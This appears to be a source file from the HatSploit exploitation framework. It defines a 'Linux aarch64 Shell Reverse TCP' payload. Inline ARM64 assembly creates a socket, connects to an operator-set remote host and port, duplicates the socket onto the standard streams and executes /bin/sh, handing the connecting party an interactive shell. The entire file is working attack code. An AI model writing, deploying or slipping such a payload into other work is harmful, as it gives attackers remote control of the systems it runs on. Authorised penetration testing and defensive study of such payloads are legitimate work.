"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux aarch64 Shell Reverse TCP",
            'Payload': "linux/aarch64/shell_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse TCP shell for Linux
                with AARCH64 architecture.
            """,
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Type': REVERSE_TCP,
        })

        self.shell = Option('SHELL', '/bin/sh', "Executable path.", True,
                            advanced=True)

    def implant(self):
        return self.__asm__(
            f"""
            bl start

            path:
                .asciz "{self.shell.value}"

            start:
                mov x1, 0x3
                mov x2, 0
                mov x8, 0x18

            dup:
                mov x0, x12
                sub x1, x1, 1
                svc 0
                cmp x1, 0
                bne dup

            shell:
                adr x0, path
                mov x1, xzr
                mov x2, xzr
                mov x8, 0xdd
                svc 0
            """
        )

    def run(self):
        return self.__asm__(
            f"""
            bl start

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x{self.rhost.little.hex()}

            start:
                mov x0, 0x2
                mov x1, 0x1
                mov x2, 0
                mov x8, 0xc6
                svc 0
                mov x12, x0

                adr x1, addr
                mov x2, 0x10
                mov x8, 0xcb
                svc 0
            """
        ) + self.implant()
